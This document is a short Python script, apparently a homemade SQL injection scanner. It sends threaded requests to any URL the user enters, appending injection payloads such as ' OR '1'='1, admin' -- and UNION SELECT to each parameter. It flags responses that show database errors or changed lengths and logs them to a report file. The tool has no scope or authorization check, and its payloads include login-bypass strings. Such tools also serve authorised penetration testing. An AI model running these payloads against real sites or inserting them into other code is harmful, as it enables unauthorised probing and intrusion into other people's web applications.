import requests
import threading
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from colorama import Fore, Style, init

# Initialize colors
init(autoreset=True)

# SQL Error Patterns
ERRORS = [
    "sql syntax",
    "mysql",
    "warning",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "syntax error",
    "odbc",
    "postgresql",
    "sqlite",
    "native client",
    "mysql_fetch",
]

# SQL Payloads
PAYLOADS = [
    "'",
    "''",
    "\"",
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "admin' --",
    "' UNION SELECT NULL --"
]

# Banner
def banner():

    print(Fore.MAGENTA + Style.BRIGHT + r"""
   _____ ____  _      _____   _____
  / ____/ __ \| |    |_   _| / ____|
 | (___| |  | | |      | |  | (___   ___ __ _ _ __
  \___ \ |  | | |      | |   \___ \ / __/ _` | '_ \
  ____) | |__| | |____ _| |_  ____) | (_| (_| | | | |
 |_____/ \___\_\______|_____| |_____/ \___\__,_|_| |_|

             ADVANCED SQL Injection Scanner
""")

# Save report
def save_report(data):

    with open("report.txt", "a") as report:
        report.write(data + "\n")
        report.write("=" * 70 + "\n")

# Check SQL Errors
def has_sql_error(response):

    for error in ERRORS:
        if error.lower() in response.lower():
            return True

    return False

# Test Payload
def test_payload(parsed, params, param, payload, normal_length):

    original_value = params[param][0]

    test_params = params.copy()
    test_params[param] = original_value + payload

    new_query = urlencode(test_params, doseq=True)

    test_url = urlunparse(
        (
            parsed.scheme,
            parsed.netloc,
            parsed.path,
            parsed.params,
            new_query,
            parsed.fragment,
        )
    )

    try:

        response = requests.get(
            test_url,
            timeout=10,
            headers={
                "User-Agent": "Mozilla/5.0 SQLiScanner"
            }
        )

        response_length = len(response.text)

        # Error-based detection
        error_detected = has_sql_error(response.text)

        # Length-based detection
        length_difference = abs(response_length - normal_length)

        if error_detected or length_difference > 50:

            print(Fore.GREEN + "\n[!] Possible SQL Injection Found!")
            print(Fore.YELLOW + f"Parameter    : {param}")
            print(Fore.YELLOW + f"Payload      : {payload}")
            print(Fore.YELLOW + f"Status Code  : {response.status_code}")
            print(Fore.YELLOW + f"Length Diff  : {length_difference}")
            print(Fore.YELLOW + f"URL          : {test_url}\n")

            report_data = f'''
Possible SQL Injection Found
Parameter   : {param}
Payload     : {payload}
Status Code : {response.status_code}
Length Diff : {length_difference}
URL         : {test_url}
'''

            save_report(report_data)

    except requests.exceptions.RequestException as e:
        print(Fore.RED + f"[!] Request Error: {e}")

# Main Scanner
def scan(target_url):

    parsed = urlparse(target_url)
    params = parse_qs(parsed.query)

    if not params:
        print(Fore.RED + "[-] No URL parameters found")
        return

    print(Fore.CYAN + f"\n[+] Testing: {target_url}\n")

    try:

        normal_response = requests.get(
            target_url,
            timeout=10,
            headers={"User-Agent": "Mozilla/5.0"}
        )

        normal_length = len(normal_response.text)

    except Exception as e:
        print(Fore.RED + f"[-] Failed to connect: {e}")
        return

    threads = []

    for param in params:

        print(Fore.BLUE + f"[+] Testing Parameter: {param}")

        for payload in PAYLOADS:

            t = threading.Thread(
                target=test_payload,
                args=(parsed, params, param, payload, normal_length)
            )

            threads.append(t)
            t.start()

    for t in threads:
        t.join()

# Run Program
banner()

target = input("Enter Target URL: ")

scan(target)
